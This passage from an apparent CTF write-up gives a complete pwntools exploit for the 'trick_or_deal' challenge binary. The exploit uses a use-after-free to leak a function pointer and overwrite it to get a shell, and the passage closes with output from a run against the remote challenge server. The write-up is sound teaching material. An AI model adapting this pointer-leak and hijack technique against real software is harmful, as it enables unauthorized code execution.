    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    elif args.REMOTE: # ('server:port')
        return remote(sys.argv[1].split(':')[0], sys.argv[1].split(':')[1])

    else:
        return process([exe.path] + argv, *a, **kw)
```

## Final

Below the full exploit script.

```Python3
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template trick_or_deal
from pwn import *

context.terminal = ['tilix', '--action=session-add-right', '-e']

# Set up pwntools for the correct architecture
exe = context.binary = ELF('trick_or_deal')

# Many built-in settings can be controlled on the command line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    elif args.REMOTE: # ('server:port')
        return remote(sys.argv[1].split(':')[0], sys.argv[1].split(':')[1])

    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set glibc 2.31
#tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'./glibc/'


# Helper functions

def free():
    io.recvuntil(b'[*] What do you want to do?')
    io.sendline(b'4')

def malloc(size, data):
    io.sendafter(b'[*] What do you want to do?', b'3\n')
    io.sendafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y\n')
    
    io.sendafter(b'[*] How long do you want your offer to be?', f"{size}".encode())
    io.sendafter(b'[*] What can you offer me? ', data)


# Exploit code

io = start()

free()

# We don't overwrite the function pointer so that we can leak it.
payload = 0x48 * b'Y'
malloc(0x58, payload)

# Leak pointer
io.sendlineafter(b'[*] What do you want to do? ', b'1')
io.recvuntil(b'Y' * 0x48)

leak = u64(io.readline()[:6] + b'\x00\x00')
log.info(f"printStorage leak: {hex(leak)}")

unlock_storage = leak + 0x319
log.info(f"unlock_storage: {hex(unlock_storage)}")

# overwrite printStorage with unlock_storage
free()

payload = b'V' * 0x48 + p64(unlock_storage)
malloc(0x50, payload)

io.sendlineafter(b'[*] What do you want to do? ', b'1')

io.sendline(b'id')
io.interactive()
```

Let's attack the remote server.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ ./xpl.py REMOTE 64.227.46.56:32650
[<font color="#66D9EF"><b>*</b></font>] &apos;/home/hackthebox/challenge/pwn/Trick_or_Deal/trick_or_deal&apos;
    Arch:     amd64-64-little
    RELRO:    <font color="#A6E22E">Full RELRO</font>
    Stack:    <font color="#A6E22E">Canary found</font>
    NX:       <font color="#A6E22E">NX enabled</font>
    PIE:      <font color="#A6E22E">PIE enabled</font>
    RUNPATH:  <font color="#F92672">b&apos;./glibc/&apos;</font>
[<font color="#A6E22E"><b>+</b></font>] Opening connection to 64.227.46.56 on port 32650: Done
[<font color="#66D9EF"><b>*</b></font>] printStorage leak: 0x559901e00be6
[<font color="#66D9EF"><b>*</b></font>] unlock_storage: 0x559901e00eff
[<font color="#66D9EF"><b>*</b></font>] Switching to interactive mode

<blink><font color="#A6E22E">[*] Bruteforcing Storage Access Code . . .</font></blink>

<font color="#A6E22E"><b>* Storage Door Opened *</b></font>
uid=999(ctf) gid=999(ctf) groups=999(ctf)
<font color="#F92672"><b>$</b></font> ls
flag.txt  glibc  ld-2.31.so  libc-2.31.so  trick_or_deal
</code></pre></div>
{{< /rawhtml >}}



